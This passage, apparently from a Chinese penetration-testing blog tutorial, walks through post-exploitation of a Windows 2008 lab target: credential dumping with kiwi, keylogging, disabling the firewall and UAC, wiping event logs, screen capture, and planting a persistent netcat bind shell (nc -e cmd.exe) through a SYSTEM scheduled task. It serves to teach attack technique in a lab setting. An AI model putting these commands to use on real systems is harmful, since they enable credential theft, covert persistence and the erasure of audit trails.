+</ul>
+<h3 id="获取账户信息"><a href="#获取账户信息" class="headerlink" title="获取账户信息"></a>获取账户信息</h3><p><strong>第三步：加载kiwi模块，通过kiwi模块获取用户口令</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; load kiwi                 //加载kiwi</span></span><br><span class="line"><span class="attr">Loading</span> <span class="string">extension kiwi...</span></span><br><span class="line"><span class="attr">Success.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; creds_all                //读取系统中的账户信息</span></span><br><span class="line"><span class="attr">[+]</span> <span class="string">Running as SYSTEM                   </span></span><br><span class="line"></span><br><span class="line"><span class="attr">Username</span>          <span class="string">Domain           Password</span></span><br><span class="line"><span class="attr">--------</span>          <span class="string">------           --------</span></span><br><span class="line"><span class="attr">(null)</span>            <span class="string">(null)           (null)</span></span><br><span class="line"><span class="attr">Administrator</span>     <span class="string">WIN-5MQI51VLCDC  ntd.cn123</span></span><br><span class="line"><span class="attr">WIN-5MQI51VLCDC$</span>  <span class="string">WORKGROUP        (null)</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p><strong>第四步：进程迁移，与稳定进程绑定</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ps -S explorer.exe             //查找explorer进程</span></span><br><span class="line"><span class="attr">Filtering</span> <span class="string">on &#x27;explorer.exe&#x27;                                                                                             </span></span><br><span class="line">                                                                                                                        </span><br><span class="line"><span class="attr">Process</span> <span class="string">List                                                                                                            </span></span><br><span class="line">============                                                                                                            </span><br><span class="line">                                                                                                                        </span><br><span class="line"> <span class="attr">PID</span>   <span class="string">PPID  Name          Arch  Session  User                           Path                                           </span></span><br><span class="line"> <span class="attr">---</span>   <span class="string">----  ----          ----  -------  ----                           ----                                           </span></span><br><span class="line"> <span class="attr">2600</span>  <span class="string">2580  explorer.exe  x64   1        WIN-5MQI51VLCDC\Administrator  C:\Windows\Explorer.EXE                        </span></span><br><span class="line">                                                                                                                        </span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; migrate 2600                //进程迁移到explorer进程上</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Migrating from 1092 to 2600...                                                                                      </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Migration completed successfully.                                                                                   </span></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; getuid                          //获取用户信息                                                                       </span></span><br><span class="line"><span class="attr">Server</span> <span class="string">username: WIN-5MQI51VLCDC\Administrator </span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p><strong>第五步：开启键盘记录</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; run post/windows/capture/keylog_recorder </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Keystrokes being saved in to /root/.msf4/loot/20231227143932_default_192.168.10.142_host.windows.key_497385.txt</span></span><br><span class="line"></span><br><span class="line"><span class="attr">//在win2008中打开记事本，输入任意内容</span></span><br><span class="line"><span class="attr">//在kali中重新打开一个终端</span></span><br><span class="line"></span><br><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">cat /root/.msf4/loot/20231227143932_default_192.168.10.142_host.windows.key_497385.txt </span></span><br><span class="line"><span class="attr">Keystroke</span> <span class="string">log from explorer.exe on WIN-5MQI51VLCDC with user WIN-5MQI51VLCDC\Administrator started at 2023-12-27 14:39:32 +0800</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user</span></span><br><span class="line"><span class="attr">&lt;Caps</span> <span class="string">Lock&gt;A&lt;Caps Lock&gt;dministrator</span></span><br><span class="line"><span class="attr">&lt;Caps</span> <span class="string">Lock&gt;T&lt;Caps Lock&gt;edu</span></span><br><span class="line"><span class="attr">.cn123&lt;^S&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h3><p><strong>第六步：添加规则backdoor，开放端口444</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; shell      //进入命令行</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;netsh advfirewall set allprofiles state off   //关闭防火墙</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;netsh advfirewall set allprofiles state on    //开启防火墙</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;netsh firewall add portopening tcp 444 backdoor enable all</span></span><br><span class="line"><span class="attr">//添加入站规则，规则名backdoor</span> <span class="string">协议 tcp 端口 444</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第七步：在win2008中查看防火墙</strong></p>
+<p><img src="/../img/img_artical/net_sec/9.3.2.png" alt="9.3.2"></p>
+<h3 id="关闭用户账户控制"><a href="#关闭用户账户控制" class="headerlink" title="关闭用户账户控制"></a>关闭用户账户控制</h3><p><strong>第八步：操作注册表关闭UAC</strong></p>
+<ul>
+<li>UAC：User Account Control用户帐户控制，是windows操作系统中一种安全控制机制,使用UAC，可以防止未经授权应用程序的自动安装，阻止恶意程序</li>
+<li>ADD添加一个注册表项</li>
+<li>&#x2F;v创建键值     &#x2F;t键值类型       &#x2F;d 键值的值       &#x2F;f强制覆盖</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt; reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="清除目标主机的日志"><a href="#清除目标主机的日志" class="headerlink" title="清除目标主机的日志"></a>清除目标主机的日志</h3><p><strong>使用clearev命令</strong></p>
+<ul>
+<li>完成清除以后，目标主机的安全日志为空</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; clearev </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Wiping 519 records from Application...</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Wiping 2049 records from System...</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Wiping 1225 records from Security...</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/img_artical/net_sec/9.3.3.png" alt="9.3.3"></p>
+<h3 id="监控主机"><a href="#监控主机" class="headerlink" title="监控主机"></a>监控主机</h3><p><strong>使用screenshot拍摄主机当前状态</strong></p>
+<p><strong>使用screenshare监控主机画面</strong></p>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; screenshot </span></span><br><span class="line"><span class="attr">Screenshot</span> <span class="string">saved to: /root/AKDYyBKA.jpeg</span></span><br><span class="line"></span><br><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; screenshare </span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Preparing player...</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Opening player at: /root/tiUhUAUW.html</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">Streaming...</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="持久性后门程序"><a href="#持久性后门程序" class="headerlink" title="持久性后门程序"></a>持久性后门程序</h2><h3 id="瑞士军刀"><a href="#瑞士军刀" class="headerlink" title="瑞士军刀"></a>瑞士军刀</h3><p><strong>NC：（netcat）</strong></p>
+<ul>
+<li>被称为网络工具中的瑞士军刀，体积小巧，但功能强大</li>
+<li>NC主要功能可以在两台设备上面相互交互，即侦听模式&#x2F;传输模式</li>
+</ul>
+<p><strong>环境准备</strong></p>
+<ul>
+<li>靶机：Windows</li>
+</ul>
+<h3 id="添加NC后门"><a href="#添加NC后门" class="headerlink" title="添加NC后门"></a>添加NC后门</h3><p><strong>第一步：上传nc.exe后门文件</strong></p>
+<ul>
+<li>上传后门程序nc.exe到Windows靶机</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">uploading  : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32</span></span><br><span class="line"><span class="attr">[*]</span> <span class="string">uploaded   : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32\nc.exe</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看上传结果及权限</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">meterpreter</span> <span class="string">&gt; ls nc.exe</span></span><br><span class="line"><span class="attr">100777/rwxrwxrwx</span>  <span class="string">59392  fil  2023-12-27 17:31:09 +0800  nc.exe</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：将nc.exe添加开机启动，监听TCP 444端口</strong></p>
+<ul>
+<li>以”计划任务”方式，开机自启</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;chcp 65001            //修改编码，防止乱码</span></span><br><span class="line"><span class="attr">chcp</span> <span class="string">65001</span></span><br><span class="line"><span class="attr">Active</span> <span class="string">code page: 65001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;schtasks /create /tn &quot;nc&quot; /ru system /tr &quot;c:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&quot; /sc onstart</span></span><br><span class="line"><span class="attr">//制订计划任务</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="查看后门任务计划"><a href="#查看后门任务计划" class="headerlink" title="查看后门任务计划"></a>查看后门任务计划</h3><p><strong>打开windows靶机”计划任务” ，查看nc后门配置</strong></p>
+<p><img src="/../img/img_artical/net_sec/9.3.4.png" alt="9.3.4"></p>
+<h3 id="使用后门"><a href="#使用后门" class="headerlink" title="使用后门"></a>使用后门</h3><p><strong>第三步：使用nc进行后门连接</strong></p>
+<ul>
+<li>重启Windows靶机，不用登录</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">┌──(root㉿kali)-[~]</span></span><br><span class="line"><span class="attr">└─#</span> <span class="string">nc 192.168.10.142 444             //使用nc建立连接</span></span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:<span class="string">\Windows\system32&gt;hostname          //查看主机名</span></span><br><span class="line"><span class="attr">hostname</span></span><br><span class="line"><span class="attr">WIN-5MQI51VLCDC</span></span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.nicopilot.online">Nicopilot</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.nicopilot.online/posts/winpte3.html">https://www.nicopilot.online/posts/winpte3.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.nicopilot.online" target="_blank">Nicopilot</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Windows渗透测试</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/net_sec/9_cover.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/winpte2.html" title="网络安全-Windows渗透测试2"><img class="cover" src="/img/cover/net_sec/9_cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">网络安全-Windows渗透测试2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/winpte1.html" title="网络安全-Windows渗透测试1"><img class="cover" src="/img/cover/net_sec/9_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-10</div><div class="title">网络安全-Windows渗透测试1</div></div></a></div><div><a href="/posts/winpte2.html" title="网络安全-Windows渗透测试2"><img class="cover" src="/img/cover/net_sec/9_cover.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-10</div><div class="title">网络安全-Windows渗透测试2</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">Windows渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8A%AB%E9%9C%B2"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞披露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A"><span class="toc-number">1.1.1.</span> <span class="toc-text">微软安全公告</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%AE%E8%BD%AF%E5%AE%89%E5%85%A8%E6%9B%B4%E6%96%B0%E6%8C%87%E5%8D%97"><span class="toc-number">1.1.2.</span> <span class="toc-text">微软安全更新指南</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFCVE"><span class="toc-number">1.1.3.</span> <span class="toc-text">什么是CVE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8A%AB%E9%9C%B2%E5%B9%B3%E5%8F%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">漏洞披露平台</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F-%E5%BC%B1%E7%82%B9%E8%AF%84%E4%BC%B0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞扫描&#x2F;弱点评估</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%BD%91%E7%BB%9C%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">什么是网络探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E6%8E%A2%E6%B5%8B%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">1.2.2.</span> <span class="toc-text">网络探测的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFOpenVAS"><span class="toc-number">1.2.3.</span> <span class="toc-text">什么是OpenVAS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenVAS%E9%83%A8%E7%BD%B2"><span class="toc-number">1.2.4.</span> <span class="toc-text">OpenVAS部署</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%89%AB%E6%8F%8F%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.2.5.</span> <span class="toc-text">执行扫描任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-Framework"><span class="toc-number">1.3.</span> <span class="toc-text">Metasploit Framework</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EMetasploit-Framework"><span class="toc-number">1.3.1.</span> <span class="toc-text">关于Metasploit Framework</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97"><span class="toc-number">1.3.2.</span> <span class="toc-text">MSF常用模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E6%A0%B8%E5%BF%83%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.</span> <span class="toc-text">MSF核心命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2015-1635%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2015-1635漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%8E%86%E5%B9%B4%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.1.</span> <span class="toc-text">Windows系统历年高危漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2015-1635%EF%BC%88MS15-034%EF%BC%89%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.2.</span> <span class="toc-text">CVE-2015-1635（MS15-034）漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC%E8%84%9A%E6%9C%AC%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.3.</span> <span class="toc-text">POC脚本检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS15-034%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.4.4.</span> <span class="toc-text">MS15-034漏洞检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS15-034-%E6%BC%8F%E6%B4%9E%E9%98%B2%E5%BE%A1"><span class="toc-number">1.4.5.</span> <span class="toc-text">MS15-034 漏洞防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-0143%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.</span> <span class="toc-text">CVE-2017-0143漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2017-0143%EF%BC%88MS17-010%EF%BC%89%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.1.</span> <span class="toc-text">CVE-2017-0143（MS17-010）漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MS17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">MS17-010漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%B4%A6%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.3.</span> <span class="toc-text">获取账户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E8%BF%81%E7%A7%BB"><span class="toc-number">1.5.4.</span> <span class="toc-text">进程迁移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.5.5.</span> <span class="toc-text">键盘记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE"><span class="toc-number">1.5.6.</span> <span class="toc-text">防火墙配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E6%8E%A7%E5%88%B6"><span class="toc-number">1.5.7.</span> <span class="toc-text">关闭用户账户控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%97%A5%E5%BF%97"><span class="toc-number">1.5.8.</span> <span class="toc-text">清除目标主机的日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E6%8E%A7%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.5.9.</span> <span class="toc-text">监控主机</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E6%80%A7%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.6.</span> <span class="toc-text">持久性后门程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80"><span class="toc-number">1.6.1.</span> <span class="toc-text">瑞士军刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0NC%E5%90%8E%E9%97%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">添加NC后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%90%8E%E9%97%A8%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92"><span class="toc-number">1.6.3.</span> <span class="toc-text">查看后门任务计划</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%90%8E%E9%97%A8"><span class="toc-number">1.6.4.</span> <span class="toc-text">使用后门</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By Nicopilot</div><div class="footer_custom_text">有一分热，发一分光，此后如竟没有炬火，我便是唯一的光</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><div class="js-pjax"></div><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 380px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 320px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(img/cover/net_sec/cover.png);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/网络安全（更新ing）/&quot;);" href="javascript:void(0);">网络安全（更新ing）</a><span class="categoryBar-list-count">38</span><span class="categoryBar-list-descr">网络安全（更新ing）</span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
